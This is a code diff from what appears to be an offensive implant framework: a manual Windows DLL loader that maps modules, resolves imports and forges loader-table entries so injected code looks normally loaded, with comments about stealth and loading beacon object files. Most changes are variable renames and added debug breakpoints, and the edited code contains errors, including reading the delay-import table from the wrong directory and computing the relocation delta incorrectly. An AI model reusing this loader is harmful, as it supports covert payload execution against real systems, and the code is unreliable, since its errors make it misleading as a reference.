@@ -373,39 +373,32 @@ namespace Modules {
         return false;
     }
 
-    BOOL ResolveImports(const EXECUTABLE *module) {
-
-        PIMAGE_IMPORT_BY_NAME import_name      = nullptr;
-        PIMAGE_DELAYLOAD_DESCRIPTOR delay_desc = nullptr;
+    BOOL ResolveImports(const EXECUTABLE *mod) {
+		PIMAGE_DATA_DIRECTORY import_dire = nullptr;
+        PIMAGE_IMPORT_BY_NAME import_name = nullptr;
 
 		LDR_DATA_TABLE_ENTRY *entry    = nullptr;
         PIMAGE_THUNK_DATA first_thunk  = nullptr;
         PIMAGE_THUNK_DATA org_first    = nullptr;
 
-		if (module->nt_head->Signature != IMAGE_NT_SIGNATURE) {
+        UINT8 local_buffer[MAX_PATH] = { };
+
+		if (mod->nt_head->Signature != IMAGE_NT_SIGNATURE) {
 			return false;
 		}
 
-        PIMAGE_DATA_DIRECTORY data_dire = module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-        UINT8 local_buffer[MAX_PATH] = { };
+		__debugbreak();
+		import_dire = &mod->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+        if (import_dire->Size) {
 
-        if (data_dire->Size) {
-            DWORD count = 0;
-
-			// NOTE: changed to use data_dire->Virtual address instead of a pointer to the index
-			__debugbreak();
-
-            PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR) B_PTR(module->base) + data_dire->VirtualAddress;
-            for (auto scan = import_desc; scan->Name; scan++) {
-                count++;
-            }
-
+            auto import_desc = (PIMAGE_IMPORT_DESCRIPTOR) mod->base + import_dire->VirtualAddress; // shlwapi.dll + 0x4a038
             for (; import_desc->Name; import_desc++) {
-                HMODULE library = nullptr;
 
-                const char *name = (char*) module->base + import_desc->Name;
+                CONST CHAR *name = (char*) mod->base + import_desc->Name;
+                HMODULE library  = nullptr;
 
-                if (entry = FindModuleEntry(HashStringA(MbsToLower((char*) local_buffer, name), MbsLength(name)))) {
+				// can we find the module already loaded in memory?
+                if (entry = FindModuleEntry(HashStringA(MbsToLower((char*)local_buffer, name), MbsLength(name)))) {
                     library = (HMODULE) entry->DllBase;
                 }
                 else {
@@ -422,8 +415,8 @@ namespace Modules {
                     library = (HMODULE) new_load->base;
                 }
 
-                first_thunk = RVA(PIMAGE_THUNK_DATA, module->base, import_desc->FirstThunk);
-                org_first = RVA(PIMAGE_THUNK_DATA, module->base, import_desc->OriginalFirstThunk);
+                first_thunk = RVA(PIMAGE_THUNK_DATA, mod->base, import_desc->FirstThunk);
+                org_first = RVA(PIMAGE_THUNK_DATA, mod->base, import_desc->OriginalFirstThunk);
 
                 for (; org_first->u1.Function; first_thunk++, org_first++) {
                     if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
@@ -431,7 +424,7 @@ namespace Modules {
                             return false;
                         }
                     } else {
-                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
+                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, mod->base, org_first->u1.AddressOfData);
                         if (!LocalLdrFindExportAddress(library, import_name->Name, 0, (void**) &first_thunk->u1.Function)) {
                             return false;
                         }
@@ -440,16 +433,16 @@ namespace Modules {
             }
         }
 
+		//import_dire = &module->nt_head->OptionalHeader[IMAGE_DIRECTORY_ENTRY_IMPORT];
         // handle the delayed import table
-        data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
 
-        if (data_dire->Size) {
-            delay_desc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, module->base, data_dire->VirtualAddress);
+        if (import_dire->Size) {
+            auto delay_desc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, mod->base, import_dire->VirtualAddress);
 
             for (; delay_desc->DllNameRVA; delay_desc++) {
                 HMODULE library = nullptr;
 
-                const CHAR *lib_name = (char*) module->base + delay_desc->DllNameRVA;
+                const CHAR *lib_name = (char*) mod->base + delay_desc->DllNameRVA;
 				const SIZE_T lib_length = MbsLength(lib_name);
                 const UINT32 name_hash = HashStringA(MbsToLower((char*) local_buffer, lib_name), lib_length);
 
@@ -469,8 +462,8 @@ namespace Modules {
                     library = (HMODULE) new_load->base;
                 }
 
-                first_thunk = RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportAddressTableRVA);
-                org_first = RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportNameTableRVA);
+                first_thunk = RVA(PIMAGE_THUNK_DATA, mod->base, delay_desc->ImportAddressTableRVA);
+                org_first = RVA(PIMAGE_THUNK_DATA, mod->base, delay_desc->ImportNameTableRVA);
 
                 for (; org_first->u1.Function; first_thunk++, org_first++) {
                     if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
@@ -478,7 +471,7 @@ namespace Modules {
                             return false;
                         }
                     } else {
-                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
+                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, mod->base, org_first->u1.AddressOfData);
                         if (!LocalLdrFindExportAddress(library, import_name->Name, 0, (void**) &first_thunk->u1.Function)) {
                             return false;
                         }
@@ -547,7 +540,7 @@ namespace Modules {
     }
 
 
-    BOOL MapModule(EXECUTABLE *module) {
+    BOOL MapModule(EXECUTABLE *mod) {
         HEXANE;
 
 		bool success = false;
@@ -556,58 +549,64 @@ namespace Modules {
 		UINT_PTR base_rva  = 0;
 		PIMAGE_DATA_DIRECTORY relocdir = nullptr;
 		
-		if (!module->nt_head) {
+		if (!mod->nt_head) {
 			return false;
 		}
 
-        module->base = module->nt_head->OptionalHeader.ImageBase;
-        region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
+        mod->base = mod->nt_head->OptionalHeader.ImageBase;
+        region_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
 
-        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
-            module->base != module->nt_head->OptionalHeader.ImageBase) {
+		__debugbreak();
+		// TODO: why the f are we re-mapping something that's already mapped? Shlwapi, kernel32 etc.
+		// this also triggers the SharedOriginal flag
 
-            module->base = 0;
-            region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
+        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+            mod->base != mod->nt_head->OptionalHeader.ImageBase ||
+			region_size != mod->nt_head->OptionalHeader.SizeOfImage) {
 
-            if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
+            mod->base = 0;
+            region_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
+
+            if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+				region_size != mod->nt_head->OptionalHeader.SizeOfImage) {
                 goto defer;
             }
         }
 
-		if (!module->base) {
+		if (!mod->base) {
 			goto defer;
 		}
 
 		// copy headers to allocated buffer
-        for (auto head_index = 0; head_index < module->nt_head->OptionalHeader.SizeOfHeaders; head_index++) {
-            B_PTR(module->base)[head_index] = B_PTR(module->buffer)[head_index];
+        for (auto head_index = 0; head_index < mod->nt_head->OptionalHeader.SizeOfHeaders; head_index++) {
+            B_PTR(mod->base)[head_index] = B_PTR(mod->buffer)[head_index];
         }
 
-		module->section = IMAGE_FIRST_SECTION(module->nt_head); 
+		mod->section = IMAGE_FIRST_SECTION(mod->nt_head); 
 
 		// copy section address to allocated buffer
-        for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
-            for (auto sec_index = 0; sec_index < module->section->SizeOfRawData; sec_index++) {
-                (B_PTR(module->base + module->section->VirtualAddress))[sec_index] = (B_PTR(module->buffer + module->section->PointerToRawData))[sec_index];
+        for (auto i = 0; i < mod->nt_head->FileHeader.NumberOfSections; i++, mod->section++) {
+            for (auto sec_index = 0; sec_index < mod->section->SizeOfRawData; sec_index++) {
+                (B_PTR(mod->base + mod->section->VirtualAddress))[sec_index] = (B_PTR(mod->buffer + mod->section->PointerToRawData))[sec_index];
             }
         }
 
-        base_rva = module->base - module->nt_head->OptionalHeader.SizeOfImage;
-        relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        base_rva = mod->base - mod->nt_head->OptionalHeader.SizeOfImage;
+        relocdir = &mod->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
         // if non-zero rva and relocdir exists...
-        if ((module->base - module->nt_head->OptionalHeader.ImageBase) && relocdir) {
-            PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);
+        if ((mod->base - mod->nt_head->OptionalHeader.ImageBase) && relocdir) {
+            PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, mod->base, relocdir->VirtualAddress);
 
             do {
                 PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY) reloc + 1;
 
                 do {
                     switch (head->Type) {
-                        case IMAGE_REL_BASED_DIR64:   *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
-                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
-                        case IMAGE_REL_BASED_HIGH:    *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
-                        case IMAGE_REL_BASED_LOW:     *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
+                        case IMAGE_REL_BASED_DIR64:   *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
+                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
+                        case IMAGE_REL_BASED_HIGH:    *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
+                        case IMAGE_REL_BASED_LOW:     *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
                     }
                     head++;
                 } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);
@@ -616,13 +615,13 @@ namespace Modules {
             } while (reloc->VirtualAddress);
         }
 
-        module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
+        mod->nt_head->OptionalHeader.ImageBase = mod->base; // set the prefered base to the real base
 		success = true;
 
 	defer:
 		if (!success) {
-			if (module->base) {
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**)&module->base, &region_size, MEM_RELEASE);
+			if (mod->base) {
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &mod->base, &region_size, MEM_RELEASE);
 			}
 		}
 
@@ -667,7 +666,7 @@ namespace Modules {
         return true;
     }
 
-    BOOL GetModulePath(EXECUTABLE *module, const uint32 name_hash) {
+    BOOL GetModulePath(EXECUTABLE *mod, const uint32 name_hash) {
         HEXANE;
 
 		WCHAR filename[MAX_PATH] = { };
@@ -679,8 +678,8 @@ namespace Modules {
             return false;
         }
 
-        module->local_name = (wchar_t*) Malloc(MAX_PATH);
-        if (!module->local_name) {
+        mod->local_name = (wchar_t*) Malloc(MAX_PATH);
+        if (!mod->local_name) {
             goto defer;
         }
 
@@ -707,24 +706,24 @@ namespace Modules {
 			goto defer;
 		}
 
-		MemCopy(B_PTR(module->local_name), (char*)sys32, sizeof(sys32));
-		WcsConcat(module->local_name, (wchar_t*)filename);
+		MemCopy(B_PTR(mod->local_name), (char*)sys32, sizeof(sys32));
+		WcsConcat(mod->local_name, (wchar_t*)filename);
 
-        module->cracked_name = (wchar_t*) Malloc(WcsLength(filename) * sizeof(wchar_t) + 1);
-		if (!module->cracked_name) {
+        mod->cracked_name = (wchar_t*) Malloc(WcsLength(filename) * sizeof(wchar_t) + 1);
+		if (!mod->cracked_name) {
 			goto defer;
 		}
 
-		MemCopy(module->cracked_name, filename, WcsLength(filename) * sizeof(wchar_t) + 1);
+		MemCopy(mod->cracked_name, filename, WcsLength(filename) * sizeof(wchar_t) + 1);
 		success = true;
 
 	defer:
 		if (!success) {
-			if (module->cracked_name) {
-				Free(module->cracked_name);
+			if (mod->cracked_name) {
+				Free(mod->cracked_name);
 			}
-			if (module->local_name) {
-				Free(module->local_name);
+			if (mod->local_name) {
+				Free(mod->local_name);
 			}
 		}
 
@@ -734,10 +733,10 @@ namespace Modules {
         return success;
     }
 
-    BOOL ReadModule(EXECUTABLE *module) {
+    BOOL ReadModule(EXECUTABLE *mod) {
         HEXANE;
 
-        HANDLE handle = ctx->win32.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+        HANDLE handle = ctx->win32.CreateFileW(mod->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
         if (handle == INVALID_HANDLE_VALUE) {
             return false;
         }
@@ -748,13 +747,13 @@ namespace Modules {
             return false;
         }
 
-        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &module->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
             ctx->win32.NtClose(handle);
             return false;
         }
 
-        if (!ctx->win32.ReadFile(handle, module->buffer, size, (DWORD*) &module->size, nullptr)) {
-            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &module->buffer, &module->size, 0);
+        if (!ctx->win32.ReadFile(handle, mod->buffer, size, (DWORD*) &mod->size, nullptr)) {
+            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &mod->size, 0);
             ctx->win32.NtClose(handle);
             return false;
         }
@@ -764,17 +763,17 @@ namespace Modules {
     }
 
 
-    BOOL LinkModule(EXECUTABLE *module) {
+    BOOL LinkModule(EXECUTABLE *mod) {
 		// TODO: needs tested
         HEXANE;
 
-		PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, module->buffer, ((PIMAGE_DOS_HEADER)module->buffer)->e_lfanew);
+		PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, mod->buffer, ((PIMAGE_DOS_HEADER)mod->buffer)->e_lfanew);
 
         UNICODE_STRING full_name = { };
 		UNICODE_STRING base_name = { };
 
-        ctx->win32.RtlInitUnicodeString(&full_name, module->local_name);
-        ctx->win32.RtlInitUnicodeString(&base_name, module->cracked_name);
+        ctx->win32.RtlInitUnicodeString(&full_name, mod->local_name);
+        ctx->win32.RtlInitUnicodeString(&base_name, mod->cracked_name);
 
         PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) Malloc(sizeof(LDR_DATA_TABLE_ENTRY));
         if (!entry) {
@@ -793,7 +792,7 @@ namespace Modules {
         entry->BaseNameHashValue = LdrHashEntry(entry->BaseDllName, false);
 
         // correctly add the base address to the entry
-        AddModuleEntry(entry, (void *) module->base);
+        AddModuleEntry(entry, (void *) mod->base);
 
         // and the rest
         entry->ImageDll = true;
@@ -803,7 +802,7 @@ namespace Modules {
         entry->InIndexes      = true;
         entry->ProcessAttachCalled = true;
         entry->InExceptionTable    = false;
-        entry->DllBase     = (void *) module->base;
+        entry->DllBase     = (void *) mod->base;
         entry->SizeOfImage = nt_head->OptionalHeader.SizeOfImage;
         entry->TimeDateStamp = nt_head->FileHeader.TimeDateStamp;
         entry->BaseDllName = base_name;
@@ -829,7 +828,7 @@ namespace Modules {
         AddHashTableEntry(entry);
 
         // set the entry point
-        entry->EntryPoint = (PLDR_INIT_ROUTINE) RVA(void *, module->base, nt_head->OptionalHeader.AddressOfEntryPoint);
+        entry->EntryPoint = (PLDR_INIT_ROUTINE) RVA(void *, mod->base, nt_head->OptionalHeader.AddressOfEntryPoint);
 
         return true;
     }
@@ -838,29 +837,29 @@ namespace Modules {
         // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
         HEXANE;
 
-        EXECUTABLE *module = (EXECUTABLE *) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
-        if (!module) {
+        EXECUTABLE *mod = (EXECUTABLE *) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
+        if (!mod) {
             return nullptr;
         }
 
-        module->success = false;
-        module->link = true;
+        mod->success = false;
+        mod->link = true;
 
         switch (LOWORD(load_type)) {
             case LoadLocalFile: {
 				// TODO: using name hashes for file search would need to hash every entry in the directory, creating performance overhead.
 				// how bad would it perform? Is the stealth payoff worth it? needs testing.
-				if (!GetModulePath(module, name_hash) || !ReadModule(module)) {
+				if (!GetModulePath(mod, name_hash) || !ReadModule(mod)) {
 					goto defer;
 				}
 
 				break;
 			}
             case LoadMemory: {
-				module->size         = mem_size;
-				module->buffer       = memory;
-				module->cracked_name = name;
-				module->local_name   = name;
+				mod->size         = mem_size;
+				mod->buffer       = memory;
+				mod->cracked_name = name;
+				mod->local_name   = name;
 
 				if (name == nullptr) {
 					goto defer;
@@ -873,50 +872,50 @@ namespace Modules {
         }
 
         if (load_type & NoLink)
-            module->link = false;
+            mod->link = false;
 
         if (name == nullptr) {
-            name = module->cracked_name;
+            name = mod->cracked_name;
         }
 
 		// see if we can find the mod already loaded in memory
         if ((load_type & LoadBof) != LoadBof) {
             if (LDR_DATA_TABLE_ENTRY *check_module = FindModuleEntry(HashStringW(name, WcsLength(name)))) {
-                module->base = (uintptr_t) check_module->DllBase;
-                module->success = true;
+                mod->base = (uintptr_t) check_module->DllBase;
+                mod->success = true;
 
                 goto defer;
             }
         }
 
-        FindHeaders(module);
-        if (!ImageCheckArch(module)) {
+        FindHeaders(mod);
+        if (!ImageCheckArch(mod)) {
             goto defer;
         }
 
         // map the sections into memory
-        if (!MapModule(module) || !ResolveImports(module)) {
+        if (!MapModule(mod) || !ResolveImports(mod)) {
             goto defer;
         }
 
-        if (module->link) {
-            if (!LinkModule(module)) {
+        if (mod->link) {
+            if (!LinkModule(mod)) {
                 goto defer;
             }
         }
 
         // trigger tls callbacks, set permissions and call the entry point
 		/*
-				if (!BeginExecution(module)) {
+				if (!BeginExecution(mod)) {
 					goto defer;
 				}
 				*/
 
-        module->success = true;
+        mod->success = true;
 
         defer:
         // TODO: delete the _executable* and keep the base. that's all I need tbh...
-        return module;
+        return mod;
     }
 
 
